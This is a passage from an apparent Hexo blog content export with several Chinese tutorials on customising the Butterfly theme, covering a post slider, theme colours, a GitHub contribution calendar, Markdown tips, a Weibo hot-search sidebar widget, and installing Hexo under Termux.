<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  priority: 2</span><br><span class="line">  enable_page: /</span><br><span class="line">  layout:</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">id</span></span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  temple_html: <span class="string">&#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;height: auto;width: 100%&quot;&gt;&lt;div class=&quot;blog-slider swiper-container-fade swiper-container-horizontal&quot; id=&quot;swiper_container&quot;&gt;$&#123;temple_html_item&#125;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">  plus_style: <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>相关含义小冰老师解释的很详细<br><a href="https://zfe.space/post/hexo-swiper.html">https://zfe.space/post/hexo-swiper.html</a></p>
</blockquote>
<h3 id="最后在文章中加入以下内容"><a href="#最后在文章中加入以下内容" class="headerlink" title="最后在文章中加入以下内容"></a>最后在文章中加入以下内容</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper_index: 8</span><br><span class="line">swiper_desc: 简单好用的 hexo 博客文章置顶插件！</span><br><span class="line">swiper_cover: /images/letter/p.png</span><br></pre></td></tr></table></figure>
<p>最后一行可不写，默认使用文章封面</p>
<h2 id="主题色"><a href="#主题色" class="headerlink" title="主题色"></a>主题色</h2><p>修改以下内容即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line"> theme_color:</span><br><span class="line">   enable: true</span><br><span class="line">   main: &quot;#49B1F5&quot;</span><br><span class="line">   paginator: &quot;#00c4b6&quot;</span><br><span class="line">   button_hover: &quot;#FF7242&quot;</span><br><span class="line">   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">   link_color: &quot;#99a9bf&quot;</span><br><span class="line">   meta_color: &quot;#858585&quot;</span><br><span class="line">   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">   code_foreground: &quot;#F47466&quot;</span><br><span class="line">   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">   blockquote_background_color: &quot;#49b1f5&quot;</span><br><span class="line">   scrollbar_color: &quot;#49b1f5&quot;</span><br><span class="line">   meta_theme_color_light: &quot;ffffff&quot;</span><br><span class="line">   meta_theme_color_dark: &quot;#0d0d0d&quot;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-github贡献日历</title>
    <url>/2025/02/12/hexo-github%E8%B4%A1%E7%8C%AE%E6%97%A5%E5%8E%86/</url>
    <content><![CDATA[<h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p><img src="/images/pasted-84.png" alt="upload successful"></p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-githubcalendar --save</span><br></pre></td></tr></table></figure>
<h2 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h2><p>要放到hexo根目录下_config.yml文件，非主题:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githubcalendar:</span><br><span class="line">  enable: true        # 是否启用本插件</span><br><span class="line">  enable_page: /      # 要生效的页面，如 / 首页，/about/ 介绍页等</span><br><span class="line">  user: w00123   # GitHub 用户名</span><br><span class="line">  layout:</span><br><span class="line">    type: id</span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  githubcalendar_html: &#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;width:100%;height:auto;padding:10px;&quot;&gt;&lt;div id=&quot;github_loading&quot; style=&quot;width:10%;height:100%;margin:0 auto;display: block&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  viewBox=&quot;0 0 50 50&quot; style=&quot;enable-background:new 0 0 50 50&quot; xml:space=&quot;preserve&quot;&gt;&lt;path fill=&quot;#d0d0d0&quot; d=&quot;M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z&quot; transform=&quot;rotate(275.098 25 25)&quot;&gt;&lt;animateTransform attributeType=&quot;xml&quot; attributeName=&quot;transform&quot; type=&quot;rotate&quot; from=&quot;0 25 25&quot; to=&quot;360 25 25&quot; dur=&quot;0.6s&quot; repeatCount=&quot;indefinite&quot;&gt;&lt;/animateTransform&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div id=&quot;github_container&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span><br><span class="line">  pc_minheight: 280px</span><br><span class="line">  mobile_minheight: 0px</span><br><span class="line">  # 贡献统计的梯度色卡值，可自行调整</span><br><span class="line">  color: &quot;[&#x27;rgba(255, 255, 255, 0.3)&#x27;, &#x27;#fdcdec&#x27;, &#x27;#fc9bd9&#x27;, &#x27;#fa6ac5&#x27;, &#x27;#f838b2&#x27;, &#x27;#f5089f&#x27;, &#x27;#c4067e&#x27;, &#x27;#92055e&#x27;, &#x27;#540336&#x27;, &#x27;#48022f&#x27;, &#x27;#30021f&#x27;]&quot; </span><br><span class="line">  # 推荐填写你自建的API接口，公用api随时可能会失效</span><br><span class="line">  # api: https://github-calendar-api.meta-code.top/api</span><br><span class="line">  api: https://githubcalendarapi.shiguang666.eu.org/api</span><br><span class="line">  # 推荐下载后使用本地文件</span><br><span class="line">  # calendar_js: https://cdn.jsdelivr.net/gh/barry-flynn/hexo-github-calendar/hexo_githubcalendar.js # 在线文件，容易加载失败</span><br><span class="line">  calendar_js: /js/hexo_githubcalendar.js # 本地文件，请下载到主题文件夹的source目录下</span><br><span class="line">  plus_style: &quot;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="自建api"><a href="#自建api" class="headerlink" title="自建api"></a>自建api</h2><blockquote>
<p>github作者：<a href="https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file">https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file</a><br>测试方法未根据作者提供的url，在建好的url后加上<code>/api?user=</code></p>
</blockquote>
<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>如果报错500，可根据这位时光大佬的操作修改：<a href="https://www.cnblogs.com/an-shiguang/p/18269053">https://www.cnblogs.com/an-shiguang/p/18269053</a></p>
</div>

<h2 id="记录500错误处理方法"><a href="#记录500错误处理方法" class="headerlink" title="记录500错误处理方法"></a>记录500错误处理方法</h2><h4 id="进入项目选择setting"><a href="#进入项目选择setting" class="headerlink" title="进入项目选择setting"></a>进入项目选择setting</h4><p>下拉找到<code>Node.js Version</code>修改版本为18.0<br><img src="/images/pasted-82.png" alt="upload successful"></p>
<h4 id="重新部署"><a href="#重新部署" class="headerlink" title="重新部署"></a>重新部署</h4><p>项目中选择<code>Deployments</code>点击<code>Redeploy</code>即可<br><img src="/images/pasted-83.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-书写</title>
    <url>/2025/02/08/hexo-%E4%B9%A6%E5%86%99/</url>
    <content><![CDATA[<h2 id="常用书写"><a href="#常用书写" class="headerlink" title="常用书写"></a>常用书写</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\```bash</span><br><span class="line"></span><br><span class="line">\```</span><br></pre></td></tr></table></figure>

<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">一级</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">二级</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>演示</p>
</blockquote>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* 1</span><br><span class="line">* 2</span><br><span class="line">* 3</span><br></pre></td></tr></table></figure>
<ul>
<li>演示</li>
</ul>
<h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. </span><br><span class="line">2. </span><br><span class="line">3. </span><br></pre></td></tr></table></figure>
<ol>
<li>演示</li>
<li>ha</li>
<li>ha</li>
</ol>
<h3 id="特殊字效果"><a href="#特殊字效果" class="headerlink" title="特殊字效果"></a>特殊字效果</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;u&gt;下划线演示&lt;/u&gt;</span><br><span class="line"></span><br><span class="line">文字**加粗**演示</span><br><span class="line"></span><br><span class="line">文字*斜体*演示</span><br><span class="line"></span><br><span class="line">文本`高亮`演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br></pre></td></tr></table></figure>

<p><u>下划线演示</u><br>文字<strong>加粗</strong>演示<br>文字<em>斜体</em>演示<br>文本<code>高亮</code>演示<br>文本<del>删除</del>线演示</p>
<h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;</span><br><span class="line">卡</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note red &#x27;fas fa-bullhorn&#x27; modern %&#125;</span><br><span class="line">通知</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;</span><br><span class="line">车</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>卡</p>
</div>
<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>通知</p>
</div>
<div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>车</p>
</div>

<h3 id="插入文章链接"><a href="#插入文章链接" class="headerlink" title="插入文章链接"></a>插入文章链接</h3><p>插入本文文章的链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hexo-书写](/2025/02/08/hexo-书写/)</span><br></pre></td></tr></table></figure>

<p><a href="/2025/02/08/hexo-%E4%B9%A6%E5%86%99/">演示</a>，还是回到本文</p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-微博热搜侧边栏</title>
    <url>/2025/02/20/hexo-%E5%BE%AE%E5%8D%9A%E7%83%AD%E6%90%9C%E4%BE%A7%E8%BE%B9%E6%A0%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习来自<code>Ldyer</code>，原文链接：</p>
<blockquote>
<p><a href="https://blog.ldyer.top/2024/04/24/%E5%BE%AE%E5%8D%9A%E7%83%AD%E6%90%9C%E6%9D%BF%E5%9D%97/index.html">https://blog.ldyer.top/2024/04/24/%E5%BE%AE%E5%8D%9A%E7%83%AD%E6%90%9C%E6%9D%BF%E5%9D%97/index.html</a></p>
</blockquote>
<p>有部分有问题的做了修改，也有部分不太符合主题的做了颜色修改。</p>
<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="/images/pasted-85.png" alt="效果"></p>
<h2 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h2><h3 id="创建widget-yml文件"><a href="#创建widget-yml文件" class="headerlink" title="创建widget.yml文件"></a>创建widget.yml文件</h3><p>如果没有这个目录需要创建，<code>source/_data/widget.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里填top表示所有地方都显示，bottom表示只在非文章页面显示，如主页等等</span></span><br><span class="line"><span class="attr">bottom:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">class_name:</span></span><br><span class="line">    <span class="attr">id_name:</span> <span class="string">weibo</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">微博热搜</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fa-brands</span> <span class="string">fa-weibo</span></span><br><span class="line">    <span class="attr">html:</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/weibo.css&quot;&gt;&lt;div</span> <span class="string">id=&quot;weiboContent&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="创建weibo-css"><a href="#创建weibo-css" class="headerlink" title="创建weibo.css"></a>创建weibo.css</h3><p>创建<code>themes/butterfly/source/css/weibo.css</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 设置从左到右的渐变背景色 */</span></span><br><span class="line"><span class="selector-id">#weibo</span><span class="selector-class">.card-widget</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, <span class="number">#4B0082</span>, <span class="number">#000000</span>) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*热度标签背景颜色*/</span></span><br><span class="line"><span class="selector-class">.weibo-new</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ff3852</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-hot</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ff9406</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-jyzy</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ffc000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-recommend</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#00b7ee</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-adrecommend</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#febd22</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-friend</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#8fc21e</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-boom</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#bd0000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-topic</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ff6f49</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-topic-ad</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#4dadff</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-boil</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f86400</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#weibo</span> <span class="selector-class">.item-content</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#weibo-container</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">250px</span>; <span class="comment">/* 容器高度固定为250px */</span></span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">95%</span>;</span><br><span class="line">    <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">    -ms-<span class="attribute">overflow</span>-style: none;</span><br><span class="line">    <span class="attribute">scrollbar-width</span>: none</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-list-item</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: row;</span><br><span class="line">    <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">    <span class="attribute">flex-wrap</span>: nowrap</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-title</span> &#123;</span><br><span class="line">    <span class="attribute">max-width</span>: auto; <span class="comment">/* 最大宽度 */</span></span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    <span class="attribute">margin-right</span>: auto</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-num</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: right;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.weibo-hotness</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">6px</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(.<span class="number">8</span>) <span class="built_in">translateX</span>(-<span class="number">3px</span>);</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">8px</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#weibo-container</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>; <span class="comment">/* 链接文字颜色 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span> <span class="selector-id">#weibo-container</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.7</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 隐藏滚动条 */</span></span><br><span class="line"><span class="selector-id">#weibo-container</span>::-webkit-scrollbar&#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="创建weibo-js文件"><a href="#创建weibo-js文件" class="headerlink" title="创建weibo.js文件"></a>创建weibo.js文件</h3><p>创建<code>themes/butterfly/source/js/weibo.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果你开启了在手机端显示侧边栏，可以将下面这行代码注释，开启下面的weibo();</span></span><br><span class="line"><span class="keyword">try</span> &#123; <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;weibo&#x27;</span>).<span class="property">clientWidth</span>) <span class="title function_">weibo</span>(); &#125; <span class="keyword">catch</span> (error) &#123;&#125;</span><br><span class="line"><span class="comment">// weibo();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">weibo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> hotness = &#123;</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;weibo-boom&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;weibo-hot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;weibo-boil&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;weibo-new&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;weibo-recommend&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;weibo-jyzy&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;weibo-jyzy&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;weibo-jyzy&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> html = <span class="string">&#x27;&lt;div id=&quot;weibo-container&quot;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">let</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;weibo&#x27;</span>));</span><br><span class="line">    <span class="keyword">let</span> nowTime = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">let</span> ls;</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">null</span> || nowTime - data.<span class="property">time</span> &gt; <span class="number">600000</span>) &#123; <span class="comment">// 600000为缓存时间，即10分钟，避免频繁请求，加快本地访问速度。</span></span><br><span class="line">        <span class="title function_">getData</span>();</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ls = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data.<span class="property">ls</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> ls) &#123;</span><br><span class="line">        html += <span class="string">&#x27;&lt;div class=&quot;weibo-list-item&quot;&gt;&lt;div class=&quot;weibo-hotness &#x27;</span> + hotness[item.<span class="property">index</span>] + <span class="string">&#x27;&quot;&gt;&#x27;</span> + item.<span class="property">index</span> + <span class="string">&#x27;&lt;/div&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;span class=&quot;weibo-title&quot;&gt;&lt;a title=&quot;&#x27;</span> + item.<span class="property">title</span> + <span class="string">&#x27;&quot; href=&quot;&#x27;</span> + item.<span class="property">url</span> + <span class="string">&#x27;&quot; target=&quot;_blank&quot; rel=&quot;external nofollow noreferrer&quot;&gt;&#x27;</span> + item.<span class="property">title</span> + <span class="string">&#x27;&lt;/a&gt;&lt;/span&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;div class=&quot;weibo-num&quot;&gt;&lt;span&gt;&#x27;</span> + item.<span class="property">hot</span> + <span class="string">&#x27;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    html += <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;weiboContent&#x27;</span>).<span class="property">innerHTML</span> = html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 这里采用新的api，如果炸了，可以换其他的，但注意api接收的json样式</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://v2.api-m.com/api/weibohot&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> data.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">code</span> === <span class="number">200</span>) &#123;</span><br><span class="line">            data = &#123; <span class="attr">time</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(), <span class="attr">ls</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data.<span class="property">data</span>) &#125;</span><br><span class="line">            <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;weibo&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data))</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;获取数据失败&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).<span class="title function_">then</span>(weibo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#bber-talk&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">var</span> swiper = <span class="keyword">new</span> <span class="title function_">swiper</span>(<span class="string">&#x27;.swiper-container&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">direction</span>: <span class="string">&#x27;vertical&#x27;</span>, </span><br><span class="line">      <span class="attr">loop</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">autoplay</span>: &#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="number">3000</span>,</span><br><span class="line">      <span class="attr">pauseOnMouseEnter</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="引入weibo-css与weibo-js"><a href="#引入weibo-css与weibo-js" class="headerlink" title="引入weibo.css与weibo.js"></a>引入weibo.css与weibo.js</h3><p>和前面一图流方式一样，在<code>themes/butterfly/_config.yml</code>中添加</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># weibo</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/weibo.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="comment"># weibo</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src=&quot;/js/weibo.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="加入卡片"><a href="#加入卡片" class="headerlink" title="加入卡片"></a>加入卡片</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line"><span class="string">..........</span></span><br><span class="line">    <span class="attr">card_webinfo:</span></span><br><span class="line">        <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">post_count:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="调整侧边栏顺序"><a href="#调整侧边栏顺序" class="headerlink" title="调整侧边栏顺序"></a>调整侧边栏顺序</h2><p>调整<code>sort_order</code>大小即可，数字越大越前，要把公告后的卡片都加上数字（有的资料说是越小越前，但是我测试不是，反正能用就行）</p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客安装方法</title>
    <url>/2024/07/31/hexo%E5%8D%9A%E5%AE%A2%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="termux安装准备"><a href="#termux安装准备" class="headerlink" title="termux安装准备"></a>termux安装准备</h2><p>pkg换源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@&#x27; $PREFIX/etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">pkg update</span><br><span class="line"></span><br><span class="line">pkg install nodejs-lts</span><br><span class="line">pkg install git</span><br><span class="line">pkg install vim</span><br></pre></td></tr></table></figure>

<p>需要在目录下运行安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir hexo</span><br><span class="line">chmod 777 hexo</span><br><span class="line">cd hexo</span><br></pre></td></tr></table></figure>

<h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><p>npm换源（淘宝）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure>

<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>

<p>启动命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>下载主题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure>

